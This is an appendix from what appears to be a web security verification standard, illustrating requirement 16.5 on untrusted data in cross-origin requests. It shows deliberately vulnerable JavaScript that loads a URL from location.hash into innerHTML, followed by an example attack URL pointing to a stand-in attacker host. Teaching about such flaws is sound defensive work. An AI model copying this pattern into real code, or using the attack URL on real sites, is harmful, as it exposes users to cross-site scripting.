# Appendix C: Code Examples

This appendix is to show code examples where required.

# V16: File and Resources Verification Requirements
| **16.5** | Verify that untrusted data is not used within cross-domain resource sharing (CORS) to protect against arbitrary remote content. | ✓ | ✓ | ✓ | 2.0 |

```
<script>

var req = new XMLHttpRequest();

req.onreadystatechange = function() {
     if(req.readyState==4 && req.status==200) {
          document.getElementById("div1").innerHTML=req.responseText;
     }
}

var resource = location.hash.substring(1);
req.open("GET",resource,true);
req.send();
</script>
```
```
<body>
<div id="div1"></div>
</body>
```
http://example.foo/main.php#profile.php

Attacker can exploit the case above by using an URL like below:

http://example.foo/main.php#http://attacker.bar/file.php
